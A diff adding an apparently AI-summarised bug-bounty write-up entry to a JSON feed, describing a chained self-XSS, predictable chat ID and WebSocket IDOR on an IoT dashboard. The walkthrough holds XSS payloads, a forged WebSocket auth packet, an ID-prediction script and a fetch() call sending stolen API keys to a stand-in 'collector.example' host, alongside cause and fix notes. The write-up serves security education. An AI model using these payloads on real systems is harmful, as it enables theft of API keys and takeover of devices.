@@ -1,5 +1,47 @@
 [
   {
+    "id": "f700b4392dc4",
+    "title": "The Art of Escalating Vulnerabilities",
+    "url": "https://medium.com/@rkvb/the-art-of-escalating-vulnerabilities-fca037815f4c",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "RkVb"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-10-07T11:15:50.000Z",
+    "added_at": "2026-10-07T11:48:41.430Z",
+    "categories": [
+      "xss",
+      "idor-bola",
+      "access-control"
+    ],
+    "severity": "critical",
+    "difficulty": "intermediate",
+    "summary_en": "By chaining a self-XSS with a predictable ID generation algorithm and a WebSocket IDOR, an attacker could inject malicious scripts into any user's chat session to steal API keys and control IoT infrastructure.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The vulnerability was caused by three architectural failures: first, the 'conversationId' was deterministic (predictable) because it was generated using a simple SHA-256 hash of a public username. Second, the WebSocket endpoint lacked authorization checks, allowing any user to connect to any chat ID and send messages. Third, the chat interface failed to sanitize (clean) user-supplied HTML, allowing a 'self-XSS' (a script that only affects the sender) to be upgraded to a 'stored XSS' (a script that affects others) via the IDOR.",
+      "walkthrough": "RECON\n1. The researcher identified an AI chat widget on an IoT dashboard and tested it for HTML injection (inserting code into a webpage).\n2. They sent a basic payload (malicious code) to see if the browser would execute it.\n<img src=x onerror=alert(document.domain)>\nWhy: This uses an image tag with a broken source ('x') to force the 'onerror' event to run JavaScript. (JavaScript is a programming language used to make websites interactive).\nDISCOVERY\n3. The researcher observed that the chat uses a WebSocket (a persistent two-way connection) to send and receive messages.\nwss://example.com/api/v1/chatbot?conversationId=chat-app-3f2a9c17d&portal=app\nWhy: This URL contains a 'conversationId' parameter (a unique label for a specific chat) which the researcher suspected could be manipulated.\n4. They tested for IDOR (Insecure Direct Object Reference, where you access data you don't own) by trying to connect to their own chat from a different account.\n{\"type\": \"user_auth\", \"user\": { \"uid\": \"TARGET_USERNAME\" }, \"conversationId\": \"chat-app-3f2a9c17d\", \"portal\": \"app\"}\nWhy: The server trusted this 'user_auth' packet (a small bundle of data) without checking if the user was actually logged in as that 'uid' (User ID).\n5. The researcher looked for how the 'conversationId' was created by searching the site's JavaScript files.\ngenerateDeterministicId(userId, portal) { let input = `${userId.toLowerCase()}-${portal.toLowerCase()}`; ... }\nWhy: This code showed that the ID was not random; it was just a hash (a mathematical fingerprint) of the username.\n6. They verified they could predict any user's ID by writing a script to mimic the server's logic.\ndef conversation_id(username, portal=\"app\"): return f\"chat-{portal}-{hashlib.sha256(data.encode()).hexdigest()[:9]}\"\nWhy: This confirmed that knowing a username is enough to calculate their private chat ID offline.\n7. They found a way to discover valid usernames using the site's registration check feature.\nPOST /api/user/checkUsername {\"username\": \"testuser1\"}\nWhy: This endpoint (a specific web address for a task) tells you if a username exists, allowing an attacker to find targets.\nEXPLOITATION\n8. The researcher combined these findings to send a malicious message to a victim's chat ID using the WebSocket IDOR.\nws.send(JSON.stringify({ type: \"chat_message\", body: \"<img src=x onerror=\\\"fetch('/api/v1/account/api-keys')...\" }));\nWhy: This sends a payload that, when viewed by the victim, will 'fetch' (request) their private API keys and send them to the attacker's server.\nIMPACT\n9. The researcher confirmed the payload executes automatically when the victim opens their chat, allowing the attacker to steal keys and modify IoT settings.\nfetch('https://collector.example/',{method:'POST',mode:'no-cors',body:d})\nWhy: This line sends the stolen data to an external 'collector' server controlled by the attacker.",
+      "example": "Imagine a support site at target.example where your ticket ID is just your 'username' encoded in Base64. If you find a 'self-XSS' in the ticket description field, it seems harmless. However, if the API endpoint 'POST /api/updateTicket' doesn't check if you own the ticket ID you are sending, you can send a request with the Base64 ID of 'admin'. When the admin views their ticket list, your script runs in their browser, potentially stealing their session cookie (a secret file used to keep you logged in).",
+      "takeaway": "Always investigate 'Self-XSS' to see if it can be delivered to other users via IDOR or CSRF. If an ID looks like a random string of characters but stays the same every time you log in, check the client-side JavaScript to see if it is 'deterministic' (calculated from public info). Use tools like Burp Suite's 'Comparer' to see how IDs differ between two accounts. A common mistake is assuming that because an ID is a complex hash, it is 'secure'—if the input to the hash is public, the ID is public.",
+      "fix": "To fix this, the 'conversationId' must be a cryptographically secure random value (like a UUIDv4) generated on the server, not derived from the username. The server must also implement strict authorization checks on the WebSocket connection to ensure the authenticated user owns the requested 'conversationId'. Finally, all user input must be sanitized using a library like DOMPurify before being rendered. \n\nExample fix (Server-side check):\nif (session.user.id !== conversation.ownerId) { throw new Error('Unauthorized'); }",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "Got invited to a private program, the company is very well known and had a massive scope so i had to run it up. Three vulnerabilities which by themselves are Low-Medium severity at most. However, when chained together they turn into a High-Critical severity issue. Here’s the what and how: ## 1: Self-XSS This particular subdomain was for their IoT solution which makes it even more critical. The site ships an AI assistant on its dashboard. Whenever I find an AI chat, or really any chat feature, the first thing I try is HTML injection and XSS. Chats are built to render user-supplied text, often w",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 60
+  },
+  {
     "id": "15947f1449df",
     "title": "From WAF Bypass to Account Takeover: Chaining Logic Flaws & CSRF in Stock Photo Platform",
     "url": "https://medium.com/@DrakenKun/from-waf-bypass-to-account-takeover-chaining-logic-flaws-csrf-in-stock-photo-platform-920ae45c936d",
